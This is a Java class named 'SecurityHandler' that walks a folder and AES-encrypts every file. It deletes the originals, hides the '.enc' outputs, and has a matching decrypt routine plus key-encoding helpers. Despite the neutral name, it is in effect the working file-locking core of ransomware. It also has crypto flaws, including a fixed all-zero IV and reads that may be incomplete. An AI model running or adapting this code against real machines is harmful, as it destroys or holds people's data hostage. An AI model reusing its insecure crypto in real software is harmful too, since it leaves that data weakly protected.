import javax.crypto.*;
import javax.crypto.spec.*;
import java.io.*;
import java.nio.file.*;
import java.security.*;
import java.util.*;

public class SecurityHandler {
    private final String folderPath;

    public SecurityHandler(String folderPath) {
        this.folderPath = folderPath;
    }

    public void decrypt(SecretKey secretKey) {
        try {
            File folder = new File(this.folderPath);
            File[] files = folder.listFiles();

            for (File file : files) {
                if (file.isFile() && file.getName().endsWith(".enc")) {
                    Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
                    cipher.init(Cipher.DECRYPT_MODE, secretKey, new IvParameterSpec(new byte[16]));

                    FileInputStream inputStream = new FileInputStream(file);
                    byte[] inputBytes = new byte[(int) file.length()];
                    inputStream.read(inputBytes);

                    byte[] outputBytes = cipher.doFinal(inputBytes);

                    String outputFilePath = file.getParent() + "\\" + file.getName().replace(".enc", "");
                    File outputFile = new File(outputFilePath);
                    FileOutputStream outputStream = new FileOutputStream(outputFile);
                    outputStream.write(outputBytes);

                    inputStream.close();
                    outputStream.close();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void encrypt(SecretKey secretKey) {
        try {
            File folder = new File(this.folderPath);
            File[] files = folder.listFiles();

            for (File file : files) {
                if (file.isFile()) {
                    Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
                    cipher.init(Cipher.ENCRYPT_MODE, secretKey, new IvParameterSpec(new byte[16]));

                    FileInputStream inputStream = new FileInputStream(file);
                    byte[] inputBytes = new byte[(int) file.length()];
                    inputStream.read(inputBytes);

                    byte[] outputBytes = cipher.doFinal(inputBytes);

                    String outputFilePath = file.getParent() + "\\" + file.getName() + ".enc";
                    File outputFile = new File(outputFilePath);
                    FileOutputStream outputStream = new FileOutputStream(outputFile);
                    outputStream.write(outputBytes);
                    inputStream.close();
                    outputStream.close();

                    if (!file.delete()) {
                        System.out.println("Failed to delete file: " + file.getAbsolutePath());
                    }

                    Path encryptedFilePath = outputFile.toPath();
                    Files.setAttribute(encryptedFilePath, "dos:hidden", true);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public SecretKey generateKey() {
        KeyGenerator keyGenerator = null;
        try {
            keyGenerator = KeyGenerator.getInstance("AES");
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException(e);
        }
        keyGenerator.init(128);
        return keyGenerator.generateKey();
    }

    public String keyToString(SecretKey secretKey) {
        return Base64.getEncoder().encodeToString(secretKey.getEncoded()) + "\n";
    }

    public SecretKey extractKey(String keyString) {
        return new SecretKeySpec(Base64.getDecoder().decode(keyString), "AES");
    }
}
